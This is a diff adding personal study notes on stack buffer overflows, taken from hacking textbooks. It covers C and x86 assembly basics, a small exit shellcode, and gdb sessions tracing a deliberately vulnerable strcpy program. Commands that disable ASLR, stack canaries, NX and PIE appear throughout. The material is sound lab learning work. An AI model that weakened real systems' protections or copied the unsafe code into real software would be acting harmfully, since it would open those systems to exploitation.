@@ -1,0 +1,1520 @@
+knjige sa buffer overflow-om:
+Gray Hat Hacking. The Ethical Hacker’s Handbook
+Penetration Testing_ A Hands-On Introduction to Hacking
+Hacking_ the art of exploitation #preporuceno
+Penetration Testing with Kali Linux v1.0.1
+The Shellcoder's Handbook_ Discovering and Exploiting Security Holes 
+
+
+####
+GDB PEDA, GEF i pwndbg
+
+source ~/peda/peda.py
+
+source /home/kangus7/pwndbg/gdbinit.py
+
+source /home/kangus7/.gdbinit-gef.py
+#####
+
+
+###########################################
+Gray Hat hacking
+###########################################
+
+
+Buffer Overflow
+
+
+####
+all C programs containg the main() function
+
+<optional return value type> main(<optional arguments) {
+	<optional procedure statements of function calls>;
+}
+
+return value/arguments are optional
+
+#what types of variables are there in C
+Data types
+C has several types of variables, but there are a few basic types:
+
+Integers 
+whole numbers which can be either positive or negative. Defined using char, int, short, long or long long.
+Unsigned integers 
+hole numbers which can only be positive. 
+Defined using unsigned char, unsigned int, unsigned short, unsigned long or unsigned long long.
+Floating point numbers 
+real numbers (numbers with fractions). Defined using float and double.
+Structures 
+will be explained later, in the Structures section.
+
+
+command line argumets for main()
+<optional return value type> main(int argc, char * argv[]) {
+	
+}
+
+Syntax:
+int main(int argc, char *argv[])
+
+Here argc counts the number of arguments on the command line and argv[ ] is a pointer array which holds pointers of type char which points to the arguments passed to the program.
+
+argc integer holds the number of arguments and the argv array holds the input arguments (strings)
+The name of the program is always stored at offset argv[0]
+
+
+####
+/*Pointers in C language is a variable that 
+stores/points the address of another variable. 
+A Pointer in C is used to allocate memory dynamically i.e. at run time. 
+The pointer variable might be belonging to any of the data type 
+such as int, float, char, double, short etc.*/
+
+/*Pointer Syntax : 
+data_type *var_name; 
+Example : 
+int *p;  char *p;
+Where, * is used to denote that “p” is pointer variable 
+and not a normal variable.*/
+
+/*& symbol is used to get the address of the variable.
+* symbol is used to get the value of the variable that 
+the pointer is pointing to.*/
+
+
+
+
+
+####
+functions (can be repedately called for executions by main() and other functions)
+<optional return value type> function name (<optional function argument>) {
+
+
+
+	
+}
+
+####
+Here, we are including the appropriate header files, which include the function declarations for exit and printf. The exit function is defined in stdlib.h, and printf is defined in stdio.h.
+A header file is a file with extension .h which contains C function declarations and macro definitions to be shared between several source files. There are two types of header files: the files that the programmer writes and the files that comes with your compiler.
+
+You request to use a header file in your program by including it with the C preprocessing directive #include, like you have seen inclusion of stdio.h header file, which comes along with your compiler.
+
+
+#include <stdio.h>
+#include <stdlib.h>
+int main(void) {
+	int val_x;
+	val_x = foo();
+	printf("The value returned is: %d\n", val_x);
+	ecit(0);
+}
+int foo() {
+	return 8;
+}
+
+
+Variables are typically defined near the top of a block of code. As the compiler chews up the code and builds a symbol table, it must be aware of a variable before that variable is used in the code later.
+
+Symbol Table is an important data structure created and maintained by the compiler in order to keep track of semantics of variable i.e. it stores information about scope and binding information about names, information about instances of various entities such as variable and function names, classes, objects, etc.
+
+
+<variable type> <variable name> <optional initialization starting with "=">;
+
+
+####
+for and while loops
+
+for loops start counting at a beginning value, test the value for some condition, execute the statement, and increment the value for the next iteration.
+
+
+for(<begining value>; <test value>; <change value>) {
+	<statement>;
+}
+
+for (i=0; i<10; i++) {
+	printf("%d", i);
+}
+
+With for loops, the condition is checked prior to the iteration of the statements in the loop, so it is possible that even the first iteration will not be executed. When the condition is not met, the flow of the program continues after the loop.
+
+
+if/else
+The if/else construct is used to execute a series of statements if a certain condition is met; otherwise, the optional else block of statements is executed. If there is no else block of statements, the flow of the program will continue after the end of the closing if block bracket (}).
+
+
+
+####
+https://fresh2refresh.com/c-programming/c-pointer/
+
+Pointers in C language is a variable that stores/points the address of another variable. A Pointer in C is used to allocate memory dynamically i.e. at run time. The pointer variable might be belonging to any of the data type such as int, float, char, double, short etc.
+Pointer Syntax : 
+data_type *var_name; 
+Example : 
+int *p;  char *p;
+Where, * is used to denote that “p” is pointer variable and not a normal variable.
+
+
+Normal variable stores the value whereas pointer variable stores the address of the variable.
+The content of the C pointer always be a whole number i.e. address.
+Always C pointer is initialized to null, i.e. int *p = null.
+The value of null pointer is 0.
+& symbol is used to get the address of the variable.
+* symbol is used to get the value of the variable that the pointer is pointing to.
+If a pointer in C is assigned to NULL, it means it is pointing to nothing.
+Two pointers can be subtracted to know how many elements are available between these two pointers.
+But, Pointer addition, multiplication, division are not allowed.
+The size of any pointer is 2 byte (for 16 bit compiler).
+
+
+####
+Assembler
+
+•   The source and destination operands are reversed, and different symbols are used to 	mark the beginning of a comment:
+•   NASM format   CMD <dest>, <source> <; comment>
+•   AT&T format   CMD <source>, <dest> <# comment>
+•   AT&T format uses a % before registers; NASM does not. The % means “indirect operand.”
+•   AT&T format uses a $ before literal values; NASM does not. The $ means “immediate 		operand.”	
+•   AT&T handles memory references differently than NASM.
+
+
+<optional label:> <mnemonic> <operands> <optional comments>
+
+mov
+The mov command copies data from the source to the destination. The value is not removed from the source location.
+Data cannot be moved directly from memory to a segment register. Instead, you must use a general-purpose register as an intermediate step.
+
+add and sub
+The add command adds the source to the destination and stores the result in the destination. The sub command subtracts the source from the destination and stores the result in the destination.
+
+push and pop
+The push and pop commands push and pop items from the stack.
+
+xor
+The xor command conducts a bitwise logical “exclusive or” (XOR) function—for example, 11111111 XOR 11111111 = 00000000. Therefore, one option is to use XOR value, value to zero out or clear a register or memory location. Another commonly used bitwise operator is AND. We could perform a bitwise AND to determine whether a specific bit within a register or memory location is set or unset, or to determine if a call to a function such as malloc returns back the pointer to a chunk as opposed to a null. This could be accomplished with assembly such as test eax, eax after a call to malloc. If the call to malloc returns a null, then the test operation will set the “zero flag” in the FLAGS register to a 1. The path followed during a conditional jump instruction such as jnz after this test can be based on the result of the AND operation.
+
+jne, je, jz, jnz, and jmp
+The jne, je, jz, jnz, and jmp commands branch the flow of the program to another location based on the value of the eflag “zero flag.” jne/jnz jumps if the zero flag equals 0; je/jz jumps if the zero flag equals 1; and jmp always jumps.
+
+call and ret
+The call instruction redirects execution to another function. The virtual memory address after the call instruction is first pushed onto the stack, serving as the return pointer, and then redirection of execution to the called function is performed. The ret command is used at the end of a procedure to return the flow to the command after the call.
+
+inc and dec
+The inc and dec commands increment and decrement the destination, respectively.
+
+System Calls: int, sysenter, and syscall
+System calls are a mechanism for a process to request a privileged operation to be performed where the context and execution of code are switched from user mode to kernel mode. The legacy x86 instruction to invoke a system call is int 0x80. This is considered deprecated, but is still supported on 32-bit OSs. The sysenter instruction is its successor for 32-bit applications. For 64-bit Linux-based OSs and applications, the syscall instruction is required. The various methods used to invoke a system call and set up the appropriate arguments must be well understood when you’re writing shellcode and other specialized programs or payloads.
+
+
+kangus7@kali:~$ nasm -f elf ~/pCloudDrive/OSCP/HTB/hello.asm 
+#ili nasm -f elf64 loader.asm -o loader.o
+
+da kompajliram 32 bitni fajl na 64 bitnoj masini
+kangus7@kali:~$ ld -m elf_i386 -s -o hello ~/pCloudDrive/OSCP/HTB/hello.o
+
+kangus7@kali:~$ ./hello  <- boom headshot
+Hello, haxor!
+
+
+How to turn off gcc compiler optimization to enable buffer overflow
+https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow
+
+Disable ASLR (Address Space Layout Randomization):
+sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+#to re-enable
+sudo echo 1 > /proc/sys/kernel/randomize_va_space
+
+Disable canaries:
+gcc overflow.c -o overflow -fno-stack-protector
+
+
+Disable canary:
+gcc vuln.c -o vuln_disable_canary -fno-stack-protector
+
+Disable DEP:
+gcc vuln.c -o vuln_disable_dep -z execstack
+
+Disable PIE:
+gcc vuln.c -o vuln_disable_pie -no-pie
+
+Disable all of protection mechanisms listed above (warning: for local testing only):
+gcc vuln.c -o vuln_disable_all -fno-stack-protector -z execstack -no-pie
+
+For 32-bit machines, you'll need to add the -m32 parameter as well.
+
+
+
+
+################
+Bluffer Overflow
+################
+
+overflow.c
+#include <string.h>
+int main() {
+	char str1[10];
+	strcpy (str1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+}
+
+
+/*Kompajler je dovljono inteligentan da primeti buffer overflow
+warning: ‘__builtin_memcpy’ writing 54 bytes into a region of size 10 
+overflows the destination [-Wstringop-overflow=]*/
+
+
+
+
+kangus7@kali:~$ ./overflow 
+Segmentation fault
+
+kangus7@kali:~$ gdb -q overflow
+Reading symbols from overflow...done.
+(gdb) run
+Starting program: /home/kangus7/overflow 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555555516b in main () at /home/kangus7/pCloudDrive/OSCP/HTB/overflow.c:5
+warning: Source file is more recent than executable. 		<- i ovo je primetio
+5	}
+(gdb) 
+
+
+to make a programm an SUID program:
+chmod u+s <filename> 
+chmod 4755 <filename>
+
+
+Shellcoding for Linux and Windows Tutorial
+http://www.vividmachines.com/shellcode/shellcode.html
+
+EAX, EBX, ECX, and EDX are all 32-bit General Purpose Registers on the x86 platform.
+AH, BH, CH and DH access the upper 16-bits of the GPRs.
+AL, BL, CL, and DL access the lower 8-bits of the GPRs.
+ESI and EDI are used when making Linux syscalls.
+Syscalls with 6 arguments or less are passed via the GPRs.
+XOR EAX, EAX is a great way to zero out a register (while staying away from the nefarious NULL byte!)
+In Windows, all function arguments are passed on the stack according to their calling convention.
+
+
+;exit.asm
+section .text
+global _start
+_start:
+; xor eax, eax sets the contents of the eax to zero
+xor eax, eax
+;moves 1 to the lower 8 bit of the of the General Purpose Register (GPR) eax
+;ne znam da li je isto sa 64bitnim registrima
+mov al, 1 ;exit is syscall 1 (system call number (1 = sys_exit))
+xor ebx, ebx ;u drugom primeru smo imali mov ebx, 0
+			 ; uglavnom eax=1, ebx=0 kada pozovemo 0x80 poziva exit funkciju
+int 0x80
+
+
+kangus7@kali:~$ nasm -f elf ~/pCloudDrive/OSCP/HTB/exit.asm
+kangus7@kali:~$ ld -m elf_i386 -o exiter ~/pCloudDrive/OSCP/HTB/exit.o
+
+
+####kako dobijamo shellcode, sto uopste nije pomenuto u Gray hacking knjizi
+drugi primeri:
+Shellcoding for Linux and Windows Tutorial
+http://www.vividmachines.com/shellcode/shellcode.html
+
+Introduction to Writing Shellcode
+https://www.exploit-db.com/papers/13224
+
+Smashing The Stack For Fun And Profit
+https://insecure.org/stf/smashstack.html
+
+
+kangus7@kali:~$ objdump -d exiter 
+
+exiter:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:	31 c0                	xor    %eax,%eax
+ 8049002:	b0 01                	mov    $0x1,%al
+ 8049004:	31 db                	xor    %ebx,%ebx
+ 8049006:	cd 80                	int    $0x80
+
+ ^			^						^
+Address 	Opcode/ Machine Code 	Assembly
+
+####lista bajtova gore predstavlja shellcode koji prebacujemo u hex
+    "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
+
+
+####sada proveravamo da li program radi ono sto treba da radi
+kangus7@kali:~$ sudo apt install -y strace
+
+kangus7@kali:~$ strace ./shellcodetest1
+execve("./shellcodetest1", ["./shellcodetest1"], 0x7fffffffe240 /* 44 vars */) = 0
+brk(NULL)                               = 0x555555559000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=124258, ...}) = 0
+mmap(NULL, 124258, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fb1000
+close(3)                                = 0
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\260A\2\0\0\0\0\0"..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0755, st_size=1824496, ...}) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7faf000
+mmap(NULL, 1837056, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7dee000
+mprotect(0x7ffff7e10000, 1658880, PROT_NONE) = 0
+mmap(0x7ffff7e10000, 1343488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7ffff7e10000
+mmap(0x7ffff7f58000, 311296, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16a000) = 0x7ffff7f58000
+mmap(0x7ffff7fa5000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b6000) = 0x7ffff7fa5000
+mmap(0x7ffff7fab000, 14336, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fab000
+close(3)                                = 0
+arch_prctl(ARCH_SET_FS, 0x7ffff7fb0500) = 0
+mprotect(0x7ffff7fa5000, 16384, PROT_READ) = 0
+mprotect(0x555555557000, 4096, PROT_READ) = 0
+mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
+munmap(0x7ffff7fb1000, 124258)          = 0
+write(1, "\t\345\377\377\377\177\0\0\0\0\0\0\0\0\0\0\32\345\377\377\377\177\0\0*\345\377\377\377\177\0\0"..., 93824992247848) = ?
++++ exited with 0 +++
+
+Here we can see the first syscall execve executing out program, followed by 
+the opening of the dynamic linker/loader ld.so (first preload then cache) to 
+load shared libraries, followed by the opening of libc, followed by its 
+idenitifcation as an ELF file ("\177ELF"), followed by our programing being 
+memory mapped, and finally our call to exit.
+
+
+
+################################
+The Shellcoders Handbook- Discovering and Exploiting Security Holes
+###############################
+
+↑ Lower addresses (0x08000000)
+Shared libraries
+.text
+.bss
+Heap (grows ↓)
+Stack (grows ↑)
+env pointer
+Argc
+↓ Higher addresses (0xbfffffff)
+
+
+#a jebo te, moram da prodjem kroz jos dve knjige da bih ovo prosao
+#debilcine
+
+
+
+
+################################
+Penetration Testing - A Hands on Introduction to Hacking
+################################
+
+
+https://travisf.net/smashing-the-stack-today
+gcc -m32 -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0 \
+    -o example1 example1.c
+
+
+-m32: compile for 32-bit
+-fno-stack-protector: disable stack canaries
+-z execstack: ensure the stack is executable (disable NX bit protection)
+-D_FORTIFY_SOURCE=0: disable FORTIFY_SOURCE
+
+To disable ASLR:
+sudo sysctl -w kernel.randomize_va_space=0
+
+To re-enable ASLR:
+sudo sysctl -w kernel.randomize_va_space=2
+
+kangus7@kali:~$ gcc -g -fno-stack-protector -z execstack -o overflowtest overflowtest.c
+
+-g  Produce debugging information in the operating system's native format (stabs, COFF, XCOFF, or DWARF
+    2).  GDB can work with this debugging information.
+
+
+https://stackoverflow.com/questions/29178445/what-is-the-z-option-for-in-this-gcc-compiler-command
+-z
+
+
+kangus7@kali:~$ gdb -q overflowtest
+Reading symbols from overflowtest...done.
+(gdb) help lsit
+Undefined command: "lsit".  Try "help".
+(gdb) help list
+List specified function or line.
+With no argument, lists ten more lines after or around previous listing.
+"list -" lists the ten lines before a previous ten-line listing.
+One argument specifies a line, and ten lines are listed around that line.
+Two arguments with comma between specify starting and ending lines to list.
+Lines can be specified in these ways:
+  LINENUM, to list around that line in current file,
+  FILE:LINENUM, to list around that line in that file,
+  FUNCTION, to list around beginning of that function,
+  FILE:FUNCTION, to distinguish among like-named static functions.
+  *ADDRESS, to list around the line containing that address.
+With two args, if one is empty, it stands for ten lines away from
+the other arg.
+
+By default, when a single location is given, display ten lines.
+This can be changed using "set listsize", and the current value
+can be shown using "show listsize".
+### ukloni komentare
+(gdb) list 1,20
+1	#include <string.h>
+2	#include <stdio.h>
+3	
+4	void overflowed() {
+5		printf("%s\n", "Execution hijacked");
+6	}
+7	
+8	void function1(char *str) {
+9		char buffer[5];
+10		strcpy(buffer, str);
+11	}
+12	
+13	void main(int argc, char *argv[]) {
+14		//prima prvi argument sa komande linije
+15		function1(argv[1]); 		
+16		printf("%s\n", "Executed normally" ); 
+17	}
+
+
+
+#### kada pokusam da kompajliram kao 32bitni program
+	nedostaju mi 32bitne biblioteke
+
+kangus7@kali:~$ gcc -o overflowtest overflowtest.c -m32 -fno-stack-protector -z execstack -ggdb
+In file included from overflowtest.c:1:
+/usr/include/string.h:26:10: fatal error: bits/libc-header-start.h: No such file or directory
+ #include <bits/libc-header-start.h>
+          ^~~~~~~~~~~~~~~~~~~~~~~~~~
+compilation terminated.
+
+
+#resenje za sve probleme
+kangus7@kali:~$ sudo apt install -y gcc-multilib
+kangus7@kali:~$ gcc -o overflowtest overflowtest.c -m32 -fno-stack-protector -z execstack -ggdb
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd290 --> 0x2 
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd290 --> 0x2 
+EDX: 0xffffd2b4 --> 0x0 
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd278 --> 0x0  				<- points to the highest memory
+											address at the bottom of the stack frame
+ESP: 0xffffd270 --> 0xffffd290 --> 0x2 	<- points to the top of the stack 
+											frame at its lowest memory address
+
+# EIP holds the memory address of
+the next instruction to be executed. Because our goal is to hijack execution
+and make the target machine execute what we want, EIP seems like a prime
+target for compromise.
+
+EIP: 0x5655621b (<main+28>:     mov    eax,DWORD PTR [eax+0x4])
+EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5655620e <main+15>:        call   0x565560b0 <__x86.get_pc_thunk.bx>
+   0x56556213 <main+20>:        add    ebx,0x2ded
+   0x56556219 <main+26>:        mov    eax,ecx
+=> 0x5655621b <main+28>:        mov    eax,DWORD PTR [eax+0x4]
+   0x5655621e <main+31>:        add    eax,0x4
+   0x56556221 <main+34>:        mov    eax,DWORD PTR [eax]
+   0x56556223 <main+36>:        sub    esp,0xc
+   0x56556226 <main+39>:        push   eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd270 --> 0xffffd290 --> 0x2 
+0004| 0xffffd274 --> 0x0 
+0008| 0xffffd278 --> 0x0 
+0012| 0xffffd27c --> 0xf7de6b41 (<__libc_start_main+241>:       add    esp,0x10)
+0016| 0xffffd280 --> 0xf7fa6000 --> 0x1d9d6c 
+0020| 0xffffd284 --> 0xf7fa6000 --> 0x1d9d6c 
+0024| 0xffffd288 --> 0x0 
+0028| 0xffffd28c --> 0xf7de6b41 (<__libc_start_main+241>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 3, main (argc=0x2, argv=0xffffd324) at overflowtest.c:14
+14              function1(argv[1]); 
+
+
+gdb-peda$ help x
+Examine memory: x/FMT ADDRESS.
+ADDRESS is an expression for the memory address to examine.
+FMT is a repeat count followed by a format letter and a size letter.
+Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),
+  t(binary), f(float), a(address), i(instruction), c(char), s(string)
+  and z(hex, zero padded on the left).
+Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).
+The specified number of objects of the specified size are printed
+according to the format.  If a negative number is specified, memory is
+examined backward from the address.
+
+Defaults for format and size letters are those previously used.
+Default count is 1.  Default address is following last thing printed
+with this command or "print".
+
+
+# stampa 16 4-byte words u heksadecimlanom formatu, pocesvsi od esp registra
+
+#ovo je tih 16 4-byte words
+gdb-peda$ x/16xw $esp
+0xffffd270:     0xffffd290      0x00000000      0x00000000      0xf7de6b41
+0xffffd280:     0xf7fa6000      0xf7fa6000      0x00000000      0xf7de6b41
+0xffffd290:     0x00000002      0xffffd324      0xffffd330      0xffffd2b4
+0xffffd2a0:     0x00000001      0x00000000      0xf7fa6000      0xffffffff
+
+#ebp je najvisa mem. adresa (pocetak stack-a)
+#esp je najnica mem. adresa (kraj stack-a)
+gdb-peda$ x/1xw $ebp
+0xffffd278:     0x00000000
+
+
+
+#na svakih cetiri bajta
+#vrednosti tih memorisjkih adresa su iz liste gore
+0xffffd270 				0xffffd270 (esp)			0xffffd290
+		 1
+		 2
+		 3
+0xffffd274 				0xffffd274 					0x00000000
+		 5
+		 6
+		 7
+0xffffd278 				0xffffd278 (ebp)			0x00000000
+		 9
+		 a
+		 b
+0xffffd27c 				0xffffd27c
+		 d
+		 e
+		 f
+
+#ovako izgleda stack
+
+0xffffd270:     0xffffd290      0x00000000      0x00000000
+
+#we can expect that when we let
+the program continue and function1 is called, the return address for main
+and a stack frame for function1 will be pushed onto the stack. Remember
+that the stack grows to lower memory addresses, so the top of the stack will
+be at a lower memory address when we hit our next breakpoint inside of
+function1 . Recall that our next breakpoint is inside function1 right before the
+strcpy command is executed.
+
+
+
+gdb-peda$ help continue
+Continue program being debugged, after signal or breakpoint.
+Usage: continue [N]
+If proceeding from breakpoint, a number N may be used as an argument,
+which means to set the ignore count of that breakpoint to N - 1 (so that
+the breakpoint won't break until the Nth time it is reached).
+
+If non-stop mode is enabled, continue only the current thread,
+otherwise all the threads in the program are continued.  To 
+continue all stopped threads in non-stop mode, use the -a option.
+Specifying -a and an ignore count simultaneously is an error.
+
+
+gdb-peda$ continue
+[----------------------------------registers-----------------------------------]
+EAX: 0x56559000 --> 0x3efc 
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd290 --> 0x2 
+EDX: 0xffffd2b4 --> 0x0 
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd258 --> 0xffffd278 --> 0x0 
+ESP: 0xffffd240 --> 0xf7fa6000 --> 0x1d9d6c 
+EIP: 0x565561e5 (<function1+17>:        sub    esp,0x8)
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x565561d8 <function1+4>:    sub    esp,0x14
+   0x565561db <function1+7>:    call   0x5655624c <__x86.get_pc_thunk.ax>
+   0x565561e0 <function1+12>:   add    eax,0x2e20
+=> 0x565561e5 <function1+17>:   sub    esp,0x8
+   0x565561e8 <function1+20>:   push   DWORD PTR [ebp+0x8]
+   0x565561eb <function1+23>:   lea    edx,[ebp-0xd]
+   0x565561ee <function1+26>:   push   edx
+   0x565561ef <function1+27>:   mov    ebx,eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd240 --> 0xf7fa6000 --> 0x1d9d6c 
+0004| 0xffffd244 --> 0xf7fa6000 --> 0x1d9d6c 
+0008| 0xffffd248 --> 0x0 
+0012| 0xffffd24c --> 0xf7dfdc7b (add    esp,0x10)
+0016| 0xffffd250 --> 0xf7fa63fc --> 0xf7fa7200 --> 0x0 
+0020| 0xffffd254 --> 0x56559000 --> 0x3efc 
+0024| 0xffffd258 --> 0xffffd278 --> 0x0 
+0028| 0xffffd25c (",bUV\320\324\377\377$\323\377\377\060\323\377\377\023bUV\220\322\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, function1 (str=0xffffd4d0 "AAAA") at overflowtest.c:10
+10              strcpy(buffer, str);
+
+gdb-peda$ x/16xw $esp
+0xffffd240:     0xf7fa6000      0xf7fa6000      0x00000000      0xf7dfdc7b
+0xffffd250:     0xf7fa63fc      0x56559000      0xffffd278      0x5655622c
+0xffffd260:     0xffffd4d0      0xffffd324      0xffffd330      0x56556213
+0xffffd270:     0xffffd290      0x00000000      0x00000000      0xf7de6b41
+
+gdb-peda$ x/1xw $ebp
+0xffffd258:     0xffffd278
+
+
+#ovo je stack
+
+#esp 			#vrednost esp
+#mem. lokacija  				0xffffd244 		0xffffd248 		0xffffd24c
+0xffffd240:     0xf7fa6000      0xf7fa6000      0x00000000      0xf7dfdc7b
+
+												#ebp
+												#vrednost ebp
+ 								0xffffd254      0xffffd258
+0xffffd250:     0xf7fa63fc      0x56559000      0xffffd278
+
+
+#stack main funkcije
+0xffffd270:     0xffffd290      0x00000000      0x00000000
+
+#stack function1 funkcije
+0xffffd240:     0xf7fa6000      0xf7fa6000      0x00000000      0xf7dfdc7b
+0xffffd250:     0xf7fa63fc      0x56559000      0xffffd278
+
+#the four-byte memory address between function1 ’s stack frame and main ’s stack frame, should be our return address for main
+
+mem.lokacije stack-a main funkcije
+0xffffd270 0xffffd274 0xffffd278
+
+mem.lokacije stack-a function1 funkcije
+0xffffd240 0xffffd244 0xffffd248 0xffffd24c 0xffffd250 0xffffd254 0xffffd258
+
+ovde bi trablo da se krije return adresa za main funkciju
+
+mem. lokacija 													0xffffd25c
+															0x5655622c
+
+mem. lokacija 					0xffffd264		0xffffd268      0xffffd26c
+0xffffd260:     0xffffd4d0      0xffffd324      0xffffd330      0x56556213
+
+imamo 4 4-byte memorijske lokacije (nije kao u knjiz) na kojima moze biti return adresa
+
+#ajmo da dissassemblujemo, jebalo me dissassemblovanje
+gdb-peda$ help disass
+Disassemble a specified section of memory.
+Default is the function surrounding the pc of the selected frame.
+
+With a /m modifier, source lines are included (if available).
+This view is "source centric": the output is in source line order,
+regardless of any optimization that is present.  Only the main source file
+is displayed, not those of, e.g., any inlined functions.
+This modifier hasn't proved useful in practice and is deprecated
+in favor of /s.
+
+With a /s modifier, source lines are included (if available).
+This differs from /m in two important respects:
+- the output is still in pc address order, and
+- file names and contents for all relevant source files are displayed.
+
+With a /r modifier, raw instructions in hex are included.
+
+With a single argument, the function surrounding that address is dumped.
+Two arguments (separated by a comma) are taken as a range of memory to dump,
+  in the form of "start,end", or "start,+length".
+
+Note that the address is interpreted as an expression, not as a location
+like in the "break" command.
+So, for example, if you want to disassemble function bar in file foo.c
+you must type "disassemble 'foo.c'::bar" and not "disassemble foo.c:bar".
+
+
+gdb-peda$ disass main
+Dump of assembler code for function main:
+   0x565561ff <+0>:     lea    ecx,[esp+0x4]
+   0x56556203 <+4>:     and    esp,0xfffffff0
+   0x56556206 <+7>:     push   DWORD PTR [ecx-0x4]
+   0x56556209 <+10>:    push   ebp
+   0x5655620a <+11>:    mov    ebp,esp
+   0x5655620c <+13>:    push   ebx
+   0x5655620d <+14>:    push   ecx
+   0x5655620e <+15>:    call   0x565560b0 <__x86.get_pc_thunk.bx>
+   0x56556213 <+20>:    add    ebx,0x2ded
+   0x56556219 <+26>:    mov    eax,ecx
+   0x5655621b <+28>:    mov    eax,DWORD PTR [eax+0x4]
+   0x5655621e <+31>:    add    eax,0x4
+   0x56556221 <+34>:    mov    eax,DWORD PTR [eax]
+   0x56556223 <+36>:    sub    esp,0xc
+   0x56556226 <+39>:    push   eax
+   # poziva se function1 funkcija
+   0x56556227 <+40>:    call   0x565561d4 <function1>
+   # sledeca instrukcija (nasa return adresa) 
+   # nasli smo je u stack-u gore
+   0x5655622c <+45>:    add    esp,0x10
+   0x5655622f <+48>:    sub    esp,0xc
+   0x56556232 <+51>:    lea    eax,[ebx-0x1fe5]
+   0x56556238 <+57>:    push   eax
+   0x56556239 <+58>:    call   0x56556040 <puts@plt>
+   0x5655623e <+63>:    add    esp,0x10
+   0x56556241 <+66>:    nop
+   0x56556242 <+67>:    lea    esp,[ebp-0x8]
+   0x56556245 <+70>:    pop    ecx
+   0x56556246 <+71>:    pop    ebx
+   0x56556247 <+72>:    pop    ebp
+   0x56556248 <+73>:    lea    esp,[ecx-0x4]
+   0x5655624b <+76>:    ret    
+End of assembler dump.
+
+
+
+gdb-peda$ continue
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd24b ("AAAA")
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd4d0 ("AAAA")
+EDX: 0xffffd24b ("AAAA")
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd258 --> 0xffffd278 --> 0x0 
+ESP: 0xffffd240 --> 0xf7fa6000 --> 0x1d9d6c 
+EIP: 0x565561f9 (<function1+37>:        nop)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x565561ef <function1+27>:   mov    ebx,eax
+   0x565561f1 <function1+29>:   call   0x56556030 <strcpy@plt>
+   0x565561f6 <function1+34>:   add    esp,0x10
+=> 0x565561f9 <function1+37>:   nop
+   0x565561fa <function1+38>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x565561fd <function1+41>:   leave  
+   0x565561fe <function1+42>:   ret    
+   0x565561ff <main>:   lea    ecx,[esp+0x4]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd240 --> 0xf7fa6000 --> 0x1d9d6c 
+0004| 0xffffd244 --> 0xf7fa6000 --> 0x1d9d6c 
+0008| 0xffffd248 --> 0x41000000 ('')
+0012| 0xffffd24c --> 0x414141 ('AAA')
+0016| 0xffffd250 --> 0xf7fa63fc --> 0xf7fa7200 --> 0x0 
+0020| 0xffffd254 --> 0x56559000 --> 0x3efc 
+0024| 0xffffd258 --> 0xffffd278 --> 0x0 
+0028| 0xffffd25c (",bUV\320\324\377\377$\323\377\377\060\323\377\377\023bUV\220\322\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, function1 (str=0xffffd4d0 "AAAA") at overflowtest.c:11
+11      }
+
+
+#hex for capital A - 0x41
+gdb-peda$ x/16xw $esp
+ 												#entered AAAA (1, then 3)
+ 												#buffer je 5 karaktera
+0xffffd240:    0xf7fa6000      0xf7fa6000      0x41000000      0x00414141
+0xffffd250:    0xf7fa63fc      0x56559000      0xffffd278      0x5655622c
+0xffffd260:    0xffffd4d0      0xffffd324      0xffffd330      0x56556213
+0xffffd270:    0xffffd290      0x00000000      0x00000000      0xf7de6b41
+
+
